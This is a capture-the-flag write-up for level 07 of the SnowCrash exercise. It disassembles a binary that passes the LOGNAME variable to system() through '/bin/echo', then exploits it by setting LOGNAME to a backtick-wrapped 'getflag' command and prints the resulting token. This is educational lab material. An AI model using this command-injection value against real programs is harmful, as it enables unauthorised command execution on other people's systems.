## LEVEL 07

---

In this level, we have a compiled file called `level07`.

```shell
$ gdb -q level07
Reading symbols from /home/user/level07/level07...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048514 <+0>:	    push   %ebp
   0x08048515 <+1>:	    mov    %esp,%ebp
   0x08048517 <+3>:	    and    $0xfffffff0,%esp
   0x0804851a <+6>:	    sub    $0x20,%esp /* Allocate 32 bytes */
   [...]
   0x0804856f <+91>:	movl   $0x8048680,(%esp)
   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
   0x0804857b <+103>:	mov    %eax,0x8(%esp)
   0x0804857f <+107>:	movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:	lea    0x14(%esp),%eax
   0x0804858b <+119>:	mov    %eax,(%esp)
   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:	mov    0x14(%esp),%eax
   0x08048597 <+131>:	mov    %eax,(%esp)
   0x0804859a <+134>:	call   0x8048410 <system@plt>
   0x0804859f <+139>:	leave
   0x080485a0 <+140>:	ret
End of assembler dump.
(gdb) x/s 0x8048680
0x8048680:	 "LOGNAME"
(gdb) x/s 0x8048688
0x8048688:	 "/bin/echo %s "
(gdb) x/32s $eax
0x804b070:	 "/bin/echo level07 "
```

This program gets the environment variable called `LOGNAME`, then uses `echo` with this variable as a parameter.

So, I will use this `echo` function to execute `getflag`.

```shell
$ export LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07
Check flag. Here is your token: fiumuikeil55xe9cu4dood66h
```